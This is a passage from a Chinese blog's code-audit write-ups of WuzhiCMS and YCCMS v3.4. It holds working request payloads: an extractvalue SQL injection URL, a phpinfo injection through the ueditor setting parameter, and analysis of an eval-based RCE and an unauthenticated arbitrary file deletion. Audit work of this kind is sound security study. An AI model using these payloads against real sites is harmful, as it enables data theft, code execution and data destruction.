class="hljs-number">0</span>, -<span class="hljs-number">4</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../configs/web_config.php&#x27;</span>;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;core.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>])) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]==<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-variable">$posttime</span> = SYS_TIME-<span class="hljs-number">300</span>;<span class="hljs-comment">//5分钟内有效</span><br><span class="hljs-variable">$db</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;db&#x27;</span>);<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;sms_checkcode&#x27;</span>,<span class="hljs-string">&quot;`code`=&#x27;<span class="hljs-subst">$code</span>&#x27; AND `posttime`&gt;<span class="hljs-subst">$posttime</span>&quot;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证通过&quot;,&quot;status&quot;:&quot;y&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php?param&#x3D;1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20–+</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080956325.png" alt="20250717144135245"></p><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><p>搜索<code>file_put_contents()</code> 函数,找到一处写入内容可控的地方。file_put_contents() 函数把一个字符串写入文件中。</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;\r\n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?m=attachment<span class="hljs-variable">&amp;f</span>=<span class="hljs-keyword">index</span><span class="hljs-variable">&amp;_su</span>=wuzhicms<span class="hljs-variable">&amp;v</span>=ueditor<span class="hljs-variable">&amp;submit</span>=1<span class="hljs-variable">&amp;setting</span>=%3Cphp%20phpinfo();%3E<br></code></pre></td></tr></table></figure><h2 id="文章："><a href="#文章：" class="headerlink" title="文章："></a>文章：</h2><p>五指CMS 4.1.0存在CSRF漏洞可增加管理员账户</p><p><a href="https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/">https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</a></p><p>wuzhicms代码审计</p><p><a href="https://blog.csdn.net/RestoreJustice/article/details/129734772">https://blog.csdn.net/RestoreJustice/article/details/129734772</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms v3.4 代码审计</title>
    <link href="/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms-v3-4-代码审计"><a href="#yccms-v3-4-代码审计" class="headerlink" title="yccms v3.4 代码审计"></a>yccms v3.4 代码审计</h1><p>程序版本：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png" alt="20250708090010810"></p><p>从这个目录结构注意到这是一个MVC模式</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png" alt="20250708135815537"></p><h2 id="通读代码"><a href="#通读代码" class="headerlink" title="通读代码"></a>通读代码</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>后台入口</p><p>require  引入文件  &#x2F;config&#x2F;run.inc.php 完成网站的初始化</p><p>路由：GET   &#x2F;admin?a&#x3D;</p><h3 id="ceshi1-ceshi2-compile"><a href="#ceshi1-ceshi2-compile" class="headerlink" title="ceshi1&amp;ceshi2&amp;compile"></a>ceshi1&amp;ceshi2&amp;compile</h3><p>都是一些页面模板</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><h4 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h4><p>数据库、Smarty以及其他的系统配置</p><h4 id="count-php"><a href="#count-php" class="headerlink" title="count.php"></a>count.php</h4><p>通过计算根目录，加载 run.inc.php文件</p><h4 id="run-inc-php"><a href="#run-inc-php" class="headerlink" title="run.inc.php"></a>run.inc.php</h4><p>初始化文件、入口文件（进入后台会调用）</p><p>功能：</p><ul><li><p>开启session，设置编码和时区</p></li><li><p>引入配置文件和模板：<code>config/config.inc.php</code></p><p>​    <code>/public/smarty/Smarty.class.php</code></p></li><li><p>自动加载类：<code>__autoload()方法用于自动加载类</code></p><p>​                    Action的类加载controller</p><p>​                    Model的类加载model</p><p>​                    其他的类加载public&#x2F;class&#x2F;</p></li><li><p>单入口：<code>Factory::setAction()-&gt;run();</code>调用控制器的run()，</p></li></ul><p>安全问题：入口文件的Factory给下面的RCE提供了入口点</p><p>配置文件会有漏洞吗？配置文件会不会泄露数据库信息？</p><h3 id="contrller"><a href="#contrller" class="headerlink" title="contrller"></a>contrller</h3><h4 id="Action-class-php"><a href="#Action-class-php" class="headerlink" title="Action.class.php"></a>Action.class.php</h4><p>所有控制器的父类</p><p>功能：</p><ul><li>定义属性</li><li>构造函数</li><li>分页、静态分页功能</li><li>控制器运行入口</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//控制器基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<span class="hljs-comment">//声明Action类，属于所有控制器的父类</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_tpl</span> = <span class="hljs-literal">null</span>;<span class="hljs-comment">//定义属性</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl = TPL::<span class="hljs-title function_ invoke__">getInstance</span>();<span class="hljs-comment">//模板渲染</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setModel</span>();<span class="hljs-comment">//创建模型对象</span><br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">setRequest</span>(); <span class="hljs-comment">//表单转义和html过滤可以防XSS、SQL</span><br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<span class="hljs-comment">//定义了一个分页函数</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Validate</span>::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_model</span>) ? <span class="hljs-variable language_">$this</span>-&gt;_model : <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">showpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><span class="hljs-comment">//静态专用</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page2</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>,<span class="hljs-variable">$_url2</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_fx</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<span class="hljs-comment">//另一种分页</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>,<span class="hljs-variable">$_url2</span>,<span class="hljs-variable">$_fx</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">listpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//控制器运行入口</span><br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<span class="hljs-comment">//url传参&#x27;?m=&#x27;,默认为index</span><br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<span class="hljs-comment">//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce</span><br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="AdminAction-class-php"><a href="#AdminAction-class-php" class="headerlink" title="AdminAction.class.php"></a>AdminAction.class.php</h4><p>管理员控制器</p><p>功能：</p><ul><li><p>加载后台首页</p></li><li><p>更改密码：使用sha1加密不安全</p></li><li><p>系统信息显示：</p><p>系统信息页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png" alt="20250711132213642"></p></li><li><p>退出时清理缓存：删除 compile 目录文件</p></li></ul><p>路由：?a&#x3D;admin&amp;m&#x3D;update -&gt; 调用 update()</p><h4 id="ArticleAction-class-php"><a href="#ArticleAction-class-php" class="headerlink" title="ArticleAction.class.php"></a>ArticleAction.class.php</h4><p>文章控制器，</p><p>功能：显示文章列表</p><p>​提供搜索功能</p><p>​增删修改文章</p><p>​nav、attr（文章的修饰属性）等功能</p><h4 id="CallAction-class-php"><a href="#CallAction-class-php" class="headerlink" title="CallAction.class.php"></a>CallAction.class.php</h4><p>功能： 验证码生成</p><p>​后台文件上传</p><p>​编辑器上传</p><h4 id="HtmlAction-class-php"><a href="#HtmlAction-class-php" class="headerlink" title="HtmlAction.class.php"></a>HtmlAction.class.php</h4><p>生成静态控制器</p><blockquote><p><strong>生成静态页面：</strong></p><p>首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类<code>Tool::HtmlFile($filename, $content)</code>，把HTML内容保存到指定路径，就可以在前端页面查看了。</p><p><strong>静态页面作用：</strong></p><ul><li>直接访问<code>.html</code>文件，不需要调动数据库查询；</li><li>页面生成后不再执行动态代码，防止SQL注入；</li><li>当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。</li></ul></blockquote><p>本网站后台修改文章内容后需要<strong>静态生成</strong>，之后方可在首页显示。</p><p>功能： 生成首页</p><p>​生成文章</p><p>​栏目列表</p><p>​模板渲染</p><p>​静态化输出</p><p>​分步处理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png" alt="20250711154124943"></p><h4 id="LinkAction-class-php"><a href="#LinkAction-class-php" class="headerlink" title="LinkAction.class.php"></a>LinkAction.class.php</h4><p>链接控制器</p><p>功能：后台管理友情链接，修改链接、排序功能</p><h4 id="LoginAction-class-php"><a href="#LoginAction-class-php" class="headerlink" title="LoginAction.class.php"></a>LoginAction.class.php</h4><p>登录控制器</p><p>功能：登录验证：sha1加密密码</p><p>​验证码</p><p>​记住密码</p><p>​AJAX 验证</p><h4 id="NavAction-class-php"><a href="#NavAction-class-php" class="headerlink" title="NavAction.class.php"></a>NavAction.class.php</h4><p>分类控制器</p><p>功能：查看、排序、增删修改分类列表</p><h4 id="PicAction-class-php"><a href="#PicAction-class-php" class="headerlink" title="PicAction.class.php"></a>PicAction.class.php</h4><p>图片控制器</p><p>功能：</p><ul><li><p>后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件</p></li><li><p>删除：没有检验图片路径，存在任意文件删除漏洞</p></li><li><p>这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//图片控制器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PicAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>&#125;<br>    <span class="hljs-comment">//这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>);<span class="hljs-comment">//打开 /uploads/ 目录</span><br><span class="hljs-variable">$_dirName</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//保存图片名</span><br><span class="hljs-variable">$_picArr</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">while</span>(!!<span class="hljs-variable">$_dirName</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$_dirPath</span>))&#123;<span class="hljs-comment">//遍历 uploads 下的文件，此处无过滤</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br><span class="hljs-variable">$_picArr</span>[] = <span class="hljs-variable">$_dirName</span>;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">krsort</span>(<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//逆序排列</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picNum&#x27;</span>,<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>))-<span class="hljs-number">2</span>);<span class="hljs-comment">//获取上传的文件数</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picArr&#x27;</span>,<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//显示上传文件</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/picshow.tpl&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="SearchAction-class-php"><a href="#SearchAction-class-php" class="headerlink" title="SearchAction.class.php"></a>SearchAction.class.php</h4><p>搜索控制器</p><p>功能：用于前端页面的内容搜索</p><h4 id="SystemAction-class-php"><a href="#SystemAction-class-php" class="headerlink" title="SystemAction.class.php"></a>SystemAction.class.php</h4><p>系统设置控制器</p><p>功能：后台系统信息、设置首页文字内容</p><h2 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h2><p><a href="https://www.cnblogs.com/phpper/p/8976304.html">PHP 中 private、public、protected区别</a></p><p><a href="https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">PHP 之 Smarty 模板引擎使用汇总</a></p><p>Smarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。</p><p><a href="https://blog.csdn.net/weixin_50602266/article/details/121910781">JavaScript之Ajax</a></p><blockquote><p>AJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。</p></blockquote><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><blockquote><p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul></blockquote><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137">YCCMS存在文件上传漏洞（CNVD-2021-47137）</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794">YCCMS存在文件上传漏洞（CNVD-2021-46794）</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795">YCCMS存在逻辑缺陷漏洞</a></p><h3 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h3><p>根据Action.class.php审计，发现<code>method_exists($this, $_m) ? eval(&#39;$this-&gt;&#39;.$_m.&#39;();&#39;) : $this-&gt;index();</code></p><p>eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config&#x2F;run.inc.php 这个文件，存在rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 